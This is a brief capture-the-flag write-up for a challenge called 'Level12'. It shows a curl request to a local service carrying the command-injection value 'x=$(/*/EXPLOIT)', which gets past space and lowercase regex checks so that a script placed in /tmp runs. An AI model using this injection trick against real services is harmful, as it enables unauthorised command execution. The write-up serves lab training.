## Level12

We create a file `/tmp/EXPLOIT` and use this command `curl localhost:4646 -d 'x=$(/*/EXPLOIT)'`.  
It will bypass the space and lowercase regex checks and execute the content of `/tmp/EXPLOIT`
that will print `getflag` in a file we can read.